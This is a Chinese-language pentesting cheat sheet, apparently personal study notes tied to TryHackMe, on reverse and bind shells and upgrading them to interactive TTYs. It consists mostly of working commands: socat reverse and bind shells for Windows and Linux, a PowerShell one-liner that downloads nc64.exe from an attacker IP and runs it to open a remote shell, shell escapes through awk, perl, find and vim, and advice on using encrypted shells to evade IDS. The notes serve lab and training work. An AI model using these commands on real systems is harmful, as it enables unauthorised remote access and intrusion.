---
tags:
  - 渗透/利用
---


**实用网站**
- 一键生成： [https://www.revshells.com/](https://www.revshells.com/)
	- windows用ps的base64可能有奇效
- [pentestmonkey](https://web.archive.org/web/20200901140719/http:/pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

![[Shell#tricks]]

---


## [[Netcat]]



## Msfvenom

> [[metasploit]]



## Socat

> [https://tryhackme.com/room/introtoshells](https://tryhackme.com/room/introtoshells)

强化版nc。但默认一般都没安装，且语法较难。理解 socat 的最简单方法是作为两点之间的连接器。

### 基础语法

#### 反弹shell

**攻击机监听：**  
`socat TCP-L:<port> -`。不稳定，等效于 `nc -lvnp <port>`。

- 两点：监听端口和标准输入。
- TCP：可当做命令的一部分（基本都会用到）
- -L：指listener
- -：也是一个option

**Windows目标：**  
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`

> The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

**Linux目标：**  
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

#### 绑定shell

**Windows目标：**  
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

> the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

**Linux目标：**  
`socat TCP-L:<PORT> EXEC:"bash -li"`

**攻击机连接：**  
`socat TCP:<TARGET-IP>:<TARGET-PORT> -`


### 进阶语法

#### 强大用途之一：完全稳定的Linux tty 反弹shell



#### 创建加密shell

除非有密钥否则无法被侦测——绕IDS。

即把基础语法命令行的 `TCP` 替换为 `OPENSSL`。

1. 关于证书（certificates）

首先，要在攻击机生成证书。







## Windows

### [[powershell#^95a867|传递nc64反连]] ^f2016a
```powershell
powershell -noprofile -Command "Invoke-WebRequest http://10.10.x.x/nc64.exe -OutFile C:\Users\Public\nc64.exe" & C:\Users\Public\nc64.exe 10.10.x.x 4444 -e powershell
```
- nc不行可以试试[ncat](https://github.com/andrew-d/static-binaries/tree/master/binaries/windows/x86)
- 切换用户：注意[[横向#RunasCs]]的妙用


## 交互式

通常反弹shell都是非交互式的——意味着无法使用交互式命令（如ssh，不会显示是否加入新的公钥）

![[Pasted image 20240414182935.png]]


### Upgrading TTY

> https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
#### python

> upgrade to a pseudo TTY

试了下就这个最好用。其他不知道为什么不支持tab键。

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
Ctrl+Z,  stty raw -echo; fg; reset

export TERM=xterm-256color
export SHELL=bash
```

此时反弹shell并没有覆盖整个终端
```bash
# 在自己的终端确认大小
stty size

# 在反弹shell配置终端大小
stty rows 47 columns 176
```

- stty：Set TeleTYpewriter
- 关闭攻击端的终端回显（terminal echo。即tab、方向键、Ctrl+C功能，之后便可在反弹shell里使用）
- 要恢复回显：reset，回车。（上面命令自动化了，退出`fg`的shell后自动执行`reest`）



#### script

`script /dev/null -c bash`

> [What Happens In a "Shell Upgrade"?](https://www.youtube.com/watch?v=DqE6DxqJg8Q)


#### sh

- `/bin/sh -i`
- `/bin/bash -i`

> [!note] 下面也可以互换sh/bash进行尝试


#### awk

似乎不咋好用（并不是交互式，也没有prompt符，但确实有生成新的shell——用`ps`可确认有效。下同）

`awk 'BEGIN {system("/bin/bash")}'`


#### perl

似乎不咋好用

`perl -e 'exec "/bin/bash";'`


#### find

似乎不咋好用，用于绕过？

`find . -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/bash")}' \; 2>/dev/null`

> [!note] This use of the find command uses the execute option (`-exec`) to initiate the shell interpreter directly. If `find` can't find the specified file, then no shell will be attained.

所以用这个：`find . -exec /bin/bash \; -quit`。没有指定特定的查找条件，所以它会找到当前目录及其子目录中的第一个文件或目录


#### vim

`vim -c ':!/bin/sh'`



#### 在python内部时

`echo os.system('/bin/bash')`



#### rlwrap：对Windows很有用

kali默认没有。安装：`sudo apt install rlwrap`

`rlwrap nc -lvnp 4444`

使用 `rlwrap` 可以让用户在运行那些本身不支持命令行编辑或历史记录（如方向键上下左右）的程序时，仍然能够享受到这些便利的功能。（tab自动补全还是不行）
- rl：readlines

给nc套了一个更为健全的shell。  
对linux时，也可以 `Ctrl+Z, stty raw -echo; fg; reset` 使其更稳定。


#### Socat

先进入nc shell作为垫脚石

将socat的二进制文件传到目标机（因为基本默认没装）
> A [standalone binary](https://github.com/andrew-d/static-binaries) of `Socat` can be transferred to a system after obtaining remote code execution to get a more stable reverse shell connection.

- 二进制文件：`wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true`

文件传输的方法参照：[[File Transfers]]

> [!NOTE] Windows上似乎socat不比nc稳定



### 更改[[终端]] tty大小

> 这是您的终端在使用常规 shell 时会自动执行的操作；但是，如果您想使用文本编辑器之类的东西来覆盖屏幕上的所有内容，则必须在反向或绑定 shell 中手动完成此操作。

- `stty -a`：查看所有配置
- `stty rows <number>`
- `stty cols <number>`

